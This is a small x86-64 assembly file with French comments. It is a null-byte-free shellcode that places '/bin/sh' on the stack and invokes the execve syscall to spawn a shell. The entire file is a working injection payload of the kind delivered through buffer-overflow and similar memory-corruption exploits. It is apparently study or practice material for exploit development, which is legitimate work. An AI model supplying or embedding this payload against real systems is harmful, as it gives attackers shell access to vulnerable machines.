BITS 64
global _start
_start:
	xor rdx, rdx               ; rdx = 0 : variables d’environnement (NULL)
	xor rsi, rsi               ; rsi = 0 : argv NULL
	xor rdi, rdi               ; rdi = 0, on va ensuite y placer l'adresse de "/bin/sh"
	xor rax,rax
	push rax
	mov rbx, 0xFF68732f6e69622f  ; "/bin/sh" en little-endian
	shl rbx,0x8
	shr rbx,0x8	
	push rbx                    ; pousser la chaîne sur la stack
	mov rdi, rsp               ; rdi = &"/bin/sh"
	mov al,0x3b
	syscall

